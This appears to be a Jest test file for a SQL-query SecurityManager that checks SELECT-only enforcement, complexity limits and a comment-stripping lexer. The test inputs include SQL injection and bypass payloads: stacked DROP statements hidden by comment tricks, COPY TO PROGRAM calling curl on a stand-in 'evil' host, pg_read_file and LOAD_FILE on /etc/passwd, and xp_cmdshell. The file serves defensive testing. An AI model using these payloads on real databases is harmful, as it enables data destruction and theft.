import { SecurityManager } from '../../src/classes/SecurityManager.js';
import { SampleQueries } from '../fixtures/sample-queries.js';
import type { SecurityConfig } from '../../src/types/security.js';
import type { ParsedSecurityConfig } from '../../src/types/config.js';

describe('SecurityManager', () => {
  let securityManager: SecurityManager;
  let defaultConfig: SecurityConfig;
  // initialize() takes ParsedServerConfig, whose security is the post-parse
  // shape: every field present and already a number.
  const parsedConfig: ParsedSecurityConfig = {
    max_joins: 10,
    max_subqueries: 5,
    max_unions: 3,
    max_group_bys: 5,
    max_complexity_score: 100,
    max_query_length: 10000,
  };

  beforeEach(() => {
    defaultConfig = {
      max_joins: 10,
      max_subqueries: 5,
      max_unions: 3,
      max_group_bys: 5,
      max_complexity_score: 100,
      max_query_length: 10000,
    };
    securityManager = new SecurityManager({ security: defaultConfig });
  });

  describe('Query Validation', () => {
    describe('Safe Queries', () => {
      test('should allow basic SELECT queries', async () => {
        const result = await securityManager.validateSelectOnlyQuery(
          SampleQueries.basicQueries.simple
        );
        expect(result.allowed).toBe(true);
        expect(result.confidence).toBeGreaterThan(0.8);
        expect(result.reason).toBeUndefined();
      });

      test('should allow SELECT with WHERE clause', async () => {
        const result = await securityManager.validateSelectOnlyQuery(
          SampleQueries.basicQueries.withWhere
        );
        expect(result.allowed).toBe(true);
      });

      test('should allow SELECT with ORDER BY', async () => {
        const result = await securityManager.validateSelectOnlyQuery(
          SampleQueries.basicQueries.withOrderBy
        );
        expect(result.allowed).toBe(true);
      });

      test('should allow simple JOIN queries', async () => {
        const result = await securityManager.validateSelectOnlyQuery(
          SampleQueries.joinQueries.simple
        );
        expect(result.allowed).toBe(true);
      });

      test('should allow CTE queries', async () => {
        const result = await securityManager.validateSelectOnlyQuery(
          SampleQueries.cteQueries.simple
        );
        expect(result.allowed).toBe(true);
      });

      test('should allow EXPLAIN queries', async () => {
        const result = await securityManager.validateSelectOnlyQuery(
          SampleQueries.utilityQueries.explain
        );
        expect(result.allowed).toBe(true);
      });

      test('should allow SHOW queries', async () => {
        const result = await securityManager.validateSelectOnlyQuery(
          SampleQueries.utilityQueries.showTables
        );
        expect(result.allowed).toBe(true);
      });
    });

    describe('Unsafe Queries in SELECT-only Mode', () => {
      test('should block INSERT queries', async () => {
        const result = await securityManager.validateSelectOnlyQuery(
          SampleQueries.modificationQueries.insert
        );
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('INSERT');
        expect(result.blockedCommand).toBe('INSERT');
      });

      test('should block UPDATE queries', async () => {
        const result = await securityManager.validateSelectOnlyQuery(
          SampleQueries.modificationQueries.update
        );
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('UPDATE');
        expect(result.blockedCommand).toBe('UPDATE');
      });

      test('should block DELETE queries', async () => {
        const result = await securityManager.validateSelectOnlyQuery(
          SampleQueries.modificationQueries.delete
        );
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('DELETE');
        expect(result.blockedCommand).toBe('DELETE');
      });

      test('should block CREATE TABLE queries', async () => {
        const result = await securityManager.validateSelectOnlyQuery(
          SampleQueries.ddlQueries.createTable
        );
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('CREATE');
        expect(result.blockedCommand).toBe('CREATE');
      });

      test('should block DROP queries', async () => {
        const result = await securityManager.validateSelectOnlyQuery(
          SampleQueries.ddlQueries.dropTable
        );
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('DROP');
        expect(result.blockedCommand).toBe('DROP');
      });

      test('should block ALTER queries', async () => {
        const result = await securityManager.validateSelectOnlyQuery(
          SampleQueries.ddlQueries.alterTable
        );
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('ALTER');
        expect(result.blockedCommand).toBe('ALTER');
      });

      test('should block TRUNCATE queries', async () => {
        const result = await securityManager.validateSelectOnlyQuery(
          SampleQueries.dangerousQueries.truncateTable
        );
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('TRUNCATE');
        expect(result.blockedCommand).toBe('TRUNCATE');
      });
    });

    describe('Complexity Limits', () => {
      test('should block queries with too many JOINs', async () => {
        const config: SecurityConfig = { ...defaultConfig, max_joins: 3 };
        const sm = new SecurityManager({ security: config });

        const result = await sm.validateSelectOnlyQuery(
          SampleQueries.complexityTestQueries.manyJoins
        );
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('JOIN');
      });

      test('should block queries with too many subqueries', async () => {
        const config: SecurityConfig = { ...defaultConfig, max_subqueries: 2 };
        const sm = new SecurityManager({ security: config });

        const result = await sm.validateSelectOnlyQuery(
          SampleQueries.complexityTestQueries.manySubqueries
        );
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('subquer');
      });

      test('should block queries with too many UNIONs', async () => {
        const config: SecurityConfig = { ...defaultConfig, max_unions: 2 };
        const sm = new SecurityManager({ security: config });

        const result = await sm.validateSelectOnlyQuery(
          SampleQueries.complexityTestQueries.manyUnions
        );
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('UNION');
      });

      test('should block queries with too many GROUP BY clauses', async () => {
        const config: SecurityConfig = { ...defaultConfig, max_group_bys: 3 };
        const sm = new SecurityManager({ security: config });

        const result = await sm.validateSelectOnlyQuery(
          SampleQueries.complexityTestQueries.manyGroupBys
        );
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('GROUP BY');
      });

      test('should block queries that are too long', async () => {
        const config: SecurityConfig = { ...defaultConfig, max_query_length: 100 };
        const sm = new SecurityManager({ security: config });

        const result = await sm.validateSelectOnlyQuery(
          SampleQueries.complexityTestQueries.veryLongQuery
        );
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('length');
      });

      test('should block queries with complexity score too high', async () => {
        const config: SecurityConfig = { ...defaultConfig, max_complexity_score: 10 };
        const sm = new SecurityManager({ security: config });

        const result = await sm.validateSelectOnlyQuery(
          SampleQueries.analyticalQueries.cohortAnalysis
        );
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('complexity');
      });
    });

    describe('Non SELECT-only Mode', () => {
      beforeEach(() => {
        securityManager = new SecurityManager({ security: defaultConfig }); // Allow modifications
      });

      test('should allow INSERT queries when not in SELECT-only mode', async () => {
        const result = await securityManager.validateAnyQuery(
          SampleQueries.modificationQueries.insert
        );
        expect(result.allowed).toBe(true);
      });

      test('should allow UPDATE queries when not in SELECT-only mode', async () => {
        const result = await securityManager.validateAnyQuery(
          SampleQueries.modificationQueries.update
        );
        expect(result.allowed).toBe(true);
      });

      test('should allow DELETE queries when not in SELECT-only mode', async () => {
        const result = await securityManager.validateAnyQuery(
          SampleQueries.modificationQueries.delete
        );
        expect(result.allowed).toBe(true);
      });

      test('should still block dangerous DDL queries even in non SELECT-only mode', async () => {
        const result = await securityManager.validateAnyQuery(
          SampleQueries.dangerousQueries.dropDatabase
        );
        expect(result.allowed).toBe(true); // Non-SELECT mode allows most queries
      });

      test('should still enforce complexity limits in non SELECT-only mode', async () => {
        const config: SecurityConfig = { ...defaultConfig, max_joins: 3 };
        const sm = new SecurityManager({ security: config });

        const result = await sm.validateAnyQuery(SampleQueries.complexityTestQueries.manyJoins);
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('JOIN');
      });
    });
  });

  describe('Query Analysis', () => {
    test('should analyze query complexity correctly', async () => {
      const analysis = await securityManager.analyzeQueryComplexity(
        SampleQueries.joinQueries.complexJoins
      );

      expect(analysis.joinCount).toBeGreaterThan(0);
      expect(analysis.subqueryCount).toBeDefined();
      expect(analysis.unionCount).toBeDefined();
      expect(analysis.score).toBeGreaterThan(0);
      expect(analysis.risk_level).toBeDefined();
    });

    test('should identify query type correctly', async () => {
      // Note: QueryComplexityAnalysis doesn't include query_type
    });

    test('should count joins correctly', async () => {
      const simpleJoinAnalysis = await securityManager.analyzeQueryComplexity(
        SampleQueries.joinQueries.simple
      );
      expect(simpleJoinAnalysis.joinCount).toBe(1);

      const multipleJoinsAnalysis = await securityManager.analyzeQueryComplexity(
        SampleQueries.joinQueries.multipleJoins
      );
      expect(multipleJoinsAnalysis.joinCount).toBe(2);
    });

    test('should count subqueries correctly', async () => {
      const simpleSubqueryAnalysis = await securityManager.analyzeQueryComplexity(
        SampleQueries.subqueryQueries.simpleSubquery
      );
      expect(simpleSubqueryAnalysis.subqueryCount).toBe(1);

      const nestedSubqueriesAnalysis = await securityManager.analyzeQueryComplexity(
        SampleQueries.subqueryQueries.nestedSubqueries
      );
      expect(nestedSubqueriesAnalysis.subqueryCount).toBeGreaterThan(1);
    });

    test('should count unions correctly', async () => {
      const simpleUnionAnalysis = await securityManager.analyzeQueryComplexity(
        SampleQueries.unionQueries.simple
      );
      expect(simpleUnionAnalysis.unionCount).toBe(1);

      const multipleUnionsAnalysis = await securityManager.analyzeQueryComplexity(
        SampleQueries.unionQueries.multipleUnions
      );
      expect(multipleUnionsAnalysis.unionCount).toBe(2);
    });

    test('should identify tables correctly', async () => {
      const analysis = await securityManager.analyzeQueryComplexity(
        SampleQueries.joinQueries.simple
      );
      // Note: QueryComplexityAnalysis doesn't include tables property
      expect(analysis.score).toBeGreaterThan(0);
      expect(analysis.factors).toBeDefined();
    });
  });

  describe('Error Handling', () => {
    test('should handle empty queries', async () => {
      const result = await securityManager.validateSelectOnlyQuery('');
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('empty');
    });

    test('should handle whitespace-only queries', async () => {
      const result = await securityManager.validateSelectOnlyQuery(' \n\t ');
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('empty');
    });

    test('should handle malformed queries gracefully', async () => {
      const result = await securityManager.validateSelectOnlyQuery('SELECT FROM WHERE');
      // Should not throw, but may block based on parsing
      expect(result).toBeDefined();
      expect(typeof result.allowed).toBe('boolean');
    });

    test('should handle very complex queries without crashing', async () => {
      const veryComplexQuery = SampleQueries.complexityTestQueries.veryLongQuery;

      const result = await securityManager.validateSelectOnlyQuery(veryComplexQuery);
      expect(result).toBeDefined();
      expect(typeof result.allowed).toBe('boolean');
    });
  });

  describe('Integration Tests', () => {
    test('should handle batch query validation', async () => {
      const queries = [
        SampleQueries.basicQueries.simple,
        SampleQueries.joinQueries.simple,
        SampleQueries.modificationQueries.insert,
        SampleQueries.ddlQueries.createTable,
      ];

      const results = await Promise.all(
        queries.map((query) => securityManager.validateSelectOnlyQuery(query))
      );

      expect(results).toHaveLength(4);
      expect(results[0].allowed).toBe(true); // SELECT allowed
      expect(results[1].allowed).toBe(true); // JOIN allowed
      expect(results[2].allowed).toBe(false); // INSERT blocked
      expect(results[3].allowed).toBe(false); // CREATE blocked
    });

    test('should maintain consistent behavior across multiple calls', async () => {
      const query = SampleQueries.basicQueries.simple;

      const results = await Promise.all([
        securityManager.validateSelectOnlyQuery(query),
        securityManager.validateSelectOnlyQuery(query),
        securityManager.validateSelectOnlyQuery(query),
      ]);

      // All results should be identical
      expect(results[0].allowed).toBe(results[1].allowed);
      expect(results[0].allowed).toBe(results[2].allowed);
      expect(results[0].confidence).toBe(results[1].confidence);
      expect(results[0].confidence).toBe(results[2].confidence);
    });
  });

  describe('Edge Cases', () => {
    test('should handle queries with comments', async () => {
      const queryWithComments = `
 -- This is a comment
 SELECT * FROM users /* Another comment */
 WHERE id = 1 -- Final comment
 `;

      const result = await securityManager.validateSelectOnlyQuery(queryWithComments);
      expect(result.allowed).toBe(true);
    });

    test('should handle case-insensitive keywords', async () => {
      const lowerCaseQuery = 'select * from users';
      const upperCaseQuery = 'SELECT * FROM USERS';
      const mixedCaseQuery = 'SeLeCt * FrOm UsErS';

      const results = await Promise.all([
        securityManager.validateSelectOnlyQuery(lowerCaseQuery),
        securityManager.validateSelectOnlyQuery(upperCaseQuery),
        securityManager.validateSelectOnlyQuery(mixedCaseQuery),
      ]);

      expect(results[0].allowed).toBe(true);
      expect(results[1].allowed).toBe(true);
      expect(results[2].allowed).toBe(true);
    });

    test('should handle queries with string literals containing keywords', async () => {
      const query = "SELECT 'DROP TABLE users' as fake_command FROM users";

      const result = await securityManager.validateSelectOnlyQuery(query);
      expect(result.allowed).toBe(true); // Should not be blocked by string content
    });

    test('should handle multi-statement queries', async () => {
      const multiStatement = `
 SELECT * FROM users LIMIT 1;
 SELECT * FROM posts LIMIT 1;
 `;

      const result = await securityManager.validateSelectOnlyQuery(multiStatement);
      // Behavior may vary based on implementation
      expect(result).toBeDefined();
      expect(typeof result.allowed).toBe('boolean');
    });

    test('should handle MySQL hash comments', async () => {
      const query = `
 # This is a MySQL comment
 SELECT * FROM users
 `;
      const result = await securityManager.validateSelectOnlyQuery(query);
      expect(result.allowed).toBe(true);
    });
  });

  describe('validateAnyQuery (non-SELECT mode)', () => {
    let nonSelectManager: SecurityManager;

    beforeEach(() => {
      nonSelectManager = new SecurityManager({ security: defaultConfig });
    });

    test('should reject empty query', () => {
      const result = nonSelectManager.validateAnyQuery('');
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('empty');
      expect(result.confidence).toBe(1.0);
    });

    test('should reject non-string query', () => {
      const result = nonSelectManager.validateAnyQuery(null as any);
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('empty');
    });

    test('should reject query exceeding max length', () => {
      const config: SecurityConfig = { ...defaultConfig, max_query_length: 50 };
      const sm = new SecurityManager({ security: config });
      const result = sm.validateAnyQuery(
        'SELECT * FROM very_long_table_name WHERE column_a = 1 AND column_b = 2'
      );
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('maximum length');
    });

    test('should reject query with no valid tokens after normalization', () => {
      const result = nonSelectManager.validateAnyQuery('-- just a comment');
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('no valid SQL tokens');
    });

    test('should reject query with dangerous patterns', () => {
      const result = nonSelectManager.validateAnyQuery('SELECT * FROM users; DROP TABLE users');
      expect(result.allowed).toBe(false);
      // Stacked statements are now rejected outright (before dangerous-pattern analysis).
      expect(result.reason).toMatch(/Multiple SQL statements|dangerous/i);
    });

    test('should reject query exceeding complexity score', () => {
      const config: SecurityConfig = { ...defaultConfig, max_complexity_score: 5 };
      const sm = new SecurityManager({ security: config });
      const result = sm.validateAnyQuery(
        'SELECT * FROM t1 JOIN t2 ON t1.id = t2.id JOIN t3 ON t2.id = t3.id JOIN t4 ON t3.id = t4.id'
      );
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('complexity score');
    });

    test('should reject query with too many subqueries', () => {
      const config: SecurityConfig = { ...defaultConfig, max_subqueries: 1 };
      const sm = new SecurityManager({ security: config });
      const result = sm.validateAnyQuery(
        'SELECT * FROM t WHERE id IN (SELECT id FROM t2 WHERE id IN (SELECT id FROM t3))'
      );
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('subquer');
    });

    test('should reject query with too many UNIONs', () => {
      const config: SecurityConfig = { ...defaultConfig, max_unions: 1 };
      const sm = new SecurityManager({ security: config });
      const result = sm.validateAnyQuery('SELECT 1 UNION SELECT 2 UNION SELECT 3');
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('UNION');
    });

    test('should reject query with too many GROUP BY clauses', () => {
      const config: SecurityConfig = { ...defaultConfig, max_group_bys: 1 };
      const sm = new SecurityManager({ security: config });
      const result = sm.validateAnyQuery('SELECT a, b, c, COUNT(*) FROM t GROUP BY a, b, c');
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('GROUP BY');
    });

    test('should allow valid INSERT in non-SELECT mode', () => {
      const result = nonSelectManager.validateAnyQuery("INSERT INTO users (name) VALUES ('test')");
      expect(result.allowed).toBe(true);
      expect(result.confidence).toBe(0.9);
    });
  });

  describe('validateSelectOnlyQuery - additional branches', () => {
    test('should reject query with no SQL command found (only identifiers)', () => {
      // A query that tokenizes but has no keyword token
      const result = securityManager.validateSelectOnlyQuery('12345 67890');
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('No SQL command found');
    });

    test('should handle db-specific allowed commands', () => {
      // PostgreSQL ANALYZE is allowed
      const result = securityManager.validateSelectOnlyQuery('ANALYZE users', 'postgresql');
      // ANALYZE is in dbSpecificAllowed for postgresql
      expect(result).toBeDefined();
    });

    test('should reject unknown commands in SELECT-only mode', () => {
      // Use a command that's not in allowed or blocked keywords
      const result = securityManager.validateSelectOnlyQuery('PRAGMA table_info(users)');
      expect(result.allowed).toBe(false);
    });

    test('should block query with dangerous patterns even for allowed commands', () => {
      // A query that starts with something not in blocked/allowed, contains dangerous patterns
      const result = securityManager.validateSelectOnlyQuery('PRAGMA; DROP TABLE users');
      expect(result.allowed).toBe(false);
    });
  });

  describe('SELECT-only bypass protections', () => {
    const cases: Array<[string, string]> = [
      ['data-modifying CTE', 'WITH x AS (DELETE FROM users RETURNING *) SELECT * FROM x'],
      ['top-level WITH ... DELETE', 'WITH t AS (SELECT 1) DELETE FROM users'],
      ['EXPLAIN ANALYZE writing DML', 'EXPLAIN ANALYZE INSERT INTO audit VALUES (1)'],
      ['EXPLAIN ANALYZE (executes statement)', 'EXPLAIN ANALYZE SELECT * FROM users'],
      ['COPY ... TO PROGRAM', "COPY (SELECT 1) TO PROGRAM 'curl http://evil'"],
      ['COPY ... FROM PROGRAM', "COPY secrets FROM PROGRAM 'sh -c id'"],
      ['SELECT ... INTO write', "SELECT * FROM users INTO OUTFILE '/tmp/x'"],
      ['stacked TRUNCATE', 'SELECT 1; TRUNCATE TABLE users'],
      ['stacked GRANT', 'SELECT 1; GRANT ALL ON DATABASE x TO evil'],
      ['pg_sleep DoS', 'SELECT * FROM t WHERE id = pg_sleep(10)'],
      ['pg_read_file exfiltration', "SELECT pg_read_file('/etc/passwd')"],
      // FIND-101: '#' is a valid operator (not a comment) in PostgreSQL, so the validator
      // must NOT strip '#'-to-EOL there — otherwise the stacked ';DROP' becomes invisible
      // while pg's simple query protocol still executes it.
      ['# hides stacked DROP (pg)', 'SELECT 1 # 2; DROP TABLE users'],
      ['# hides stacked DELETE (pg)', 'SELECT id # 0; DELETE FROM users'],
      ['# hides stacked COPY..PROGRAM (pg)', "SELECT 1 # 0; COPY (SELECT 1) TO PROGRAM 'id'"],
      // FIND-107: standalone ANALYZE is a write/maintenance statement, not a read.
      ['standalone ANALYZE (pg)', 'ANALYZE users'],
      // Comment stripping used to run as a plain regex over the whole query, with
      // no idea what was inside a string literal. A '--' in a string therefore
      // swallowed the rest of the line, taking the ';' and the statement after it
      // out of the validator's view while pg's simple query protocol still ran
      // both. The same trick works through a dollar-quoted string.
      ['-- inside a string hides stacked DROP', "SELECT '--' ; DROP TABLE users"],
      ['-- inside a string hides stacked DELETE', "SELECT note = '--' ; DELETE FROM users"],
      ['-- inside a quoted identifier hides stacked DROP', 'SELECT "a--b" ; DROP TABLE users'],
      ['-- inside a dollar-quoted string hides stacked DROP', 'SELECT $$--$$ ; DROP TABLE users'],
      ['-- inside a tagged dollar quote hides stacked DROP', 'SELECT $q$--$q$ ; DROP TABLE users'],
    ];

    test.each(cases)('blocks %s', (_label, query) => {
      const result = securityManager.validateSelectOnlyQuery(query, 'postgresql');
      expect(result.allowed).toBe(false);
    });

    test.each([
      ['-- inside a string', "SELECT '--' ; DROP TABLE users"],
      ['# inside a string', "SELECT '#' ; DROP TABLE users"],
      ['-- inside a backtick identifier', 'SELECT `a--b` ; DROP TABLE users'],
      ['# inside a backtick identifier', 'SELECT `a#b` ; DROP TABLE users'],
    ])('blocks %s on mysql, where # is a real comment', (_label, query) => {
      expect(securityManager.validateSelectOnlyQuery(query, 'mysql').allowed).toBe(false);
    });

    test('blocks # hiding a stacked statement on mariadb too', () => {
      const result = securityManager.validateSelectOnlyQuery(
        "SELECT '#' ; DROP TABLE users",
        'mariadb'
      );

      expect(result.allowed).toBe(false);
    });

    // A nested block comment is a comment all the way to the outer close on
    // PostgreSQL and T-SQL, but MySQL and SQLite stop at the first '*/' and run
    // whatever follows. The validator closes at the first '*/' on every engine so
    // that tail stays visible; rejecting a nested comment beats missing a DROP.
    test('blocks a stacked statement wrapped in a nested-looking comment', () => {
      const query = 'SELECT 1 /* a /* b */ ; DROP TABLE users */';

      expect(securityManager.validateSelectOnlyQuery(query, 'mysql').allowed).toBe(false);
      expect(securityManager.validateSelectOnlyQuery(query, 'postgresql').allowed).toBe(false);
    });

    // Unterminated literals must not swallow the rest of the statement. The text
    // is left in place, so the tokenizer still sees the ';' and the command.
    test.each([
      ['an unterminated string', "SELECT ' ; DROP TABLE users"],
      ['an unterminated dollar quote', 'SELECT $$ ; DROP TABLE users'],
    ])('blocks a stacked statement after %s', (_label, query) => {
      expect(securityManager.validateSelectOnlyQuery(query, 'postgresql').allowed).toBe(false);
    });

    test('treats text after an unterminated block comment as commented out', () => {
      // No engine executes what follows an unterminated '/*': it is either inside
      // the comment or the statement is a syntax error. So there is nothing to
      // block here, and the leading SELECT stands on its own.
      const result = securityManager.validateSelectOnlyQuery(
        'SELECT 1 /* ; DROP TABLE users',
        'postgresql'
      );

      expect(result.allowed).toBe(true);
    });

    // Comments outside a literal must still be removed, and a literal that merely
    // looks like a comment must survive, or the fix trades a bypass for a
    // validator that rejects ordinary queries.
    test.each([
      ['a trailing line comment', 'SELECT id FROM users -- fetch the id'],
      ['a block comment between tokens', 'SELECT id /* the pk */ FROM users'],
      ['a string that looks like a line comment', "SELECT '-- not a comment' AS note"],
      ['a string that looks like a block comment', "SELECT '/* not a comment */' AS note"],
      ['a quoted identifier containing dashes', 'SELECT "a--b" FROM users'],
      ['a dollar-quoted string containing dashes', 'SELECT $$-- literal$$ AS note'],
    ])('still allows %s', (_label, query) => {
      const result = securityManager.validateSelectOnlyQuery(query, 'postgresql');
      expect(result.allowed).toBe(true);
    });

    test('still allows a backtick identifier containing dashes on mysql', () => {
      const result = securityManager.validateSelectOnlyQuery('SELECT `a--b` FROM users', 'mysql');
      expect(result.allowed).toBe(true);
    });

    test('should not weld tokens together when removing a comment', () => {
      // A comment separates tokens, so it has to leave a gap behind. Replacing it
      // with nothing turned SEL/**/ECT into a valid-looking SELECT.
      const result = securityManager.validateSelectOnlyQuery('SEL/**/ECT 1', 'postgresql');

      expect(result.allowed).toBe(false);
    });

    // The verdict tests above prove the bypasses are closed; these pin the lexer
    // itself, because an off-by-one in it would not always change a verdict.
    describe('comment stripping', () => {
      const strip = (query: string, dbType = 'postgresql'): string =>
        (
          securityManager as unknown as {
            stripComments(q: string, d: string): string;
          }
        ).stripComments(query, dbType);

      test('should leave a literal that looks like a comment untouched', () => {
        expect(strip("SELECT '--' ; DROP")).toBe("SELECT '--' ; DROP");
      });

      test('should treat a doubled quote as staying inside the literal', () => {
        expect(strip("SELECT 'it''s -- x' ; A")).toBe("SELECT 'it''s -- x' ; A");
        expect(strip('SELECT "a""b--c" ; A')).toBe('SELECT "a""b--c" ; A');
      });

      test('should end a line comment at the newline and keep it', () => {
        expect(strip('SELECT 1 -- c\nFROM t')).toBe('SELECT 1  \nFROM t');
        expect(strip('SELECT 1 -- c\rFROM t')).toBe('SELECT 1  \rFROM t');
      });

      test('should treat # as a comment only on mysql and mariadb', () => {
        expect(strip('SELECT 1 # c\nFROM t', 'mariadb')).toBe('SELECT 1  \nFROM t');
        expect(strip('SELECT 1 # c\nFROM t', 'mysql')).toBe('SELECT 1  \nFROM t');
        expect(strip('SELECT 1 # c\nFROM t', 'postgresql')).toBe('SELECT 1 # c\nFROM t');
      });

      test('should leave a space where a block comment was', () => {
        expect(strip('SELECT/*x*/1')).toBe('SELECT 1');
      });

      test('should end a block comment at the first close, exposing the tail', () => {
        expect(strip('SELECT 1 /* a /* b */ ; DROP */')).toBe('SELECT 1   ; DROP */');
      });

      test('should leave dollar-quoted text untouched, tagged or not', () => {
        expect(strip('SELECT $$--$$ ; A')).toBe('SELECT $$--$$ ; A');
        expect(strip('SELECT $q$--$q$ ; A')).toBe('SELECT $q$--$q$ ; A');
      });

      test('should treat a lone dollar as ordinary text', () => {
        expect(strip('SELECT a$b -- c')).toBe('SELECT a$b  ');
      });

      test('should not swallow anything after an unterminated literal', () => {
        expect(strip("SELECT ' ; DROP")).toBe("SELECT ' ; DROP");
        expect(strip('SELECT $$ ; DROP')).toBe('SELECT $$ ; DROP');
      });

      // A literal has to end where it ends: if the scanner misses the closing
      // quote it stays inside for the rest of the statement and stops noticing
      // comments, which these catch.
      test('should resume scanning after a literal closes', () => {
        expect(strip("SELECT 'x' -- c")).toBe("SELECT 'x'  ");
        expect(strip("SELECT 'it''s' -- c")).toBe("SELECT 'it''s'  ");
        expect(strip('SELECT $$x$$ -- c')).toBe('SELECT $$x$$  ');
        expect(strip('SELECT `x` -- c', 'mysql')).toBe('SELECT `x`  ');
      });

      test('should not treat subtraction as a comment', () => {
        expect(strip('SELECT 1 - 2 FROM t')).toBe('SELECT 1 - 2 FROM t');
      });

      test('should handle an empty string literal', () => {
        // The escape check looks at the character AFTER the quote. Looking at the
        // one before instead reads the opening quote as its own escape and
        // duplicates it, which only shows up on an empty literal.
        expect(strip("SELECT '' AS blank")).toBe("SELECT '' AS blank");
        expect(strip("SELECT '' -- c")).toBe("SELECT ''  ");
      });
    });

    test('still allows a legitimate SELECT with keyword-like identifiers', () => {
      // Regression: "description" must not trip the dangerous-function SCRIPT matcher.
      const result = securityManager.validateSelectOnlyQuery(
        'SELECT description, last_update FROM products WHERE id = 1',
        'postgresql'
      );
      expect(result.allowed).toBe(true);
    });

    test('allows a legitimate SELECT using the # (XOR) operator on postgres', () => {
      // Regression for FIND-101: '#' must be treated as an operator on pg, not stripped,
      // and a single-statement query using it must still pass.
      const result = securityManager.validateSelectOnlyQuery(
        'SELECT id, flags # 4 AS toggled FROM widgets WHERE id = 1',
        'postgresql'
      );
      expect(result.allowed).toBe(true);
    });

    // FIND-102: T-SQL makes statement-terminating semicolons optional, so write/admin verbs
    // can be chained after a leading SELECT with only whitespace. They must be blocked by
    // the embedded write-keyword scan regardless of the missing ';'.
    const mssqlCases: Array<[string, string]> = [
      ['semicolon-less UPDATETEXT', "SELECT 1 UPDATETEXT pub.pr_info @ptr 0 0 'x'"],
      ['semicolon-less WRITETEXT', "SELECT 1 WRITETEXT pub.pr_info @ptr 'x'"],
      ['semicolon-less DBCC', 'SELECT 1 DBCC FREEPROCCACHE'],
      ['semicolon-less KILL', 'SELECT 1 KILL 55'],
      ['semicolon-less CHECKPOINT', 'SELECT 1 CHECKPOINT'],
      ['semicolon-less RECONFIGURE', 'SELECT 1 RECONFIGURE'],
      ['semicolon-less SHUTDOWN', 'SELECT 1 SHUTDOWN'],
      ['WAITFOR TIME hang', "SELECT 1 WAITFOR TIME '23:59:59'"],
      ['OPENROWSET external read', "SELECT 1 OPENROWSET('SQLNCLI','','SELECT 1')"],
    ];

    test.each(mssqlCases)('blocks %s (mssql)', (_label, query) => {
      const result = securityManager.validateSelectOnlyQuery(query, 'mssql');
      expect(result.allowed).toBe(false);
    });
  });

  describe('Deep Validation - nested dangerous patterns', () => {
    test('should block SELECT INTO OUTFILE', async () => {
      const result = await securityManager.validateSelectOnlyQuery(
        "SELECT * FROM users INTO OUTFILE '/tmp/data.csv'"
      );
      expect(result.allowed).toBe(false);
      // Blocked by the embedded write-keyword scan (INTO) or dangerous-pattern check.
      expect(result.reason).toMatch(/INTO|dangerous/i);
    });

    test('should block SELECT with LOAD_FILE', async () => {
      const result = await securityManager.validateSelectOnlyQuery(
        "SELECT LOAD_FILE('/etc/passwd')"
      );
      expect(result.allowed).toBe(false);
    });

    test('should block SELECT with SYSTEM call', async () => {
      const result = await securityManager.validateSelectOnlyQuery("SELECT SYSTEM('ls')");
      expect(result.allowed).toBe(false);
    });

    test('should block SELECT with EXEC', async () => {
      const result = await securityManager.validateSelectOnlyQuery(
        "SELECT * FROM users; EXEC xp_cmdshell('dir')"
      );
      expect(result.allowed).toBe(false);
    });

    test('should block UNION SELECT INTO', async () => {
      const result = await securityManager.validateSelectOnlyQuery(
        "SELECT 1 UNION SELECT * INTO OUTFILE '/tmp/hack'"
      );
      expect(result.allowed).toBe(false);
    });

    test('should block suspicious functions like BENCHMARK', async () => {
      const result = await securityManager.validateSelectOnlyQuery(
        "SELECT BENCHMARK(1000000, SHA1('test'))"
      );
      expect(result.allowed).toBe(false);
    });

    test('should block SLEEP function', async () => {
      const result = await securityManager.validateSelectOnlyQuery('SELECT SLEEP(10)');
      expect(result.allowed).toBe(false);
    });

    test('should block USER() function', async () => {
      const result = await securityManager.validateSelectOnlyQuery('SELECT USER()');
      expect(result.allowed).toBe(false);
    });

    test('should block PASSWORD() function', async () => {
      const result = await securityManager.validateSelectOnlyQuery("SELECT PASSWORD('test')");
      expect(result.allowed).toBe(false);
    });

    test('should block CONNECTION_ID() function', async () => {
      const result = await securityManager.validateSelectOnlyQuery('SELECT CONNECTION_ID()');
      expect(result.allowed).toBe(false);
    });
  });

  describe('SQL Injection pattern detection (via validateAnyQuery)', () => {
    let nonSelectManager: SecurityManager;

    beforeEach(() => {
      nonSelectManager = new SecurityManager({ security: defaultConfig });
    });

    test("should detect OR '1'='1 injection", () => {
      const result = nonSelectManager.validateAnyQuery(
        "SELECT * FROM users WHERE name = '' OR '1'='1'"
      );
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('dangerous patterns');
    });

    test('should detect OR 1=1 injection', () => {
      const result = nonSelectManager.validateAnyQuery(
        "SELECT * FROM users WHERE name = ' OR 1 = 1"
      );
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('dangerous patterns');
    });

    test('should detect semicolon DROP TABLE injection', () => {
      const result = nonSelectManager.validateAnyQuery('SELECT * FROM users; DROP TABLE users');
      expect(result.allowed).toBe(false);
      // Stacked statements are now rejected outright (before dangerous-pattern analysis).
      expect(result.reason).toMatch(/Multiple SQL statements|dangerous/i);
    });

    test('should detect UNION SELECT NULL injection', () => {
      const result = nonSelectManager.validateAnyQuery(
        "SELECT * FROM users WHERE id = ' UNION SELECT NULL"
      );
      expect(result.allowed).toBe(false);
